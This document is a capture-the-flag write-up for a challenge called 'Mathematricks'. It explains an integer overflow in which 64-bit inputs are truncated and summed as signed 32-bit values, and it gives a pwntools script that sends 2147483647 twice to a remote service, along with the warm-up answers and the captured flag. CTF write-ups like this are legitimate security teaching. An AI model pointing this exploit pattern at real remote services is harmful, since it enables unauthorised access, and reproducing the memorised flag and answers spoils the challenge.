# Mathematricks

## Summary

Integer overflow: two positive 64-bit numbers whose lower 32 bits sum to a negative `int32_t`, satisfying `n1 > 0 && n2 > 0 && (int32_t)(n1 + n2) < 0`.

## Solution

### Step 1: Answer the warm-up questions

Q1 = `2`, Q2 = `1`, Q3 = `0`.

### Step 2: Trigger the integer overflow

The `game()` function reads `n1` and `n2` as `uint64_t` (via `strtoul`), but only their lower 32 bits participate in the addition (via `eax`/`edx` registers). The result is compared as a 32-bit signed integer:

```c
int32_t n3 = (int32_t)n1 + (int32_t)n2;  // truncated to 32 bits
if (n1 > 0 && n2 > 0 && n3 < 0)
    read_flag();
```

Two `0x7FFFFFFF` values: each is positive as uint64, but `(int32_t)0x7FFFFFFF + (int32_t)0x7FFFFFFF = 0xFFFFFFFE = -2`.

```python
from pwn import *

context.arch = 'amd64'
p = remote('154.57.164.66', 32289)

p.sendlineafter('🥸 ', '1')
p.sendlineafter('> ', '2')
p.sendlineafter('> ', '1')
p.sendlineafter('> ', '0')
p.sendlineafter('n1: ', '2147483647')
p.sendlineafter('n2: ', '2147483647')

flag = p.recvline_contains(b'HTB').strip().decode()
print(flag)
```

## Flag

```
HTB{m4th3m4tINT_tr1ck_0R_tr34t}
```
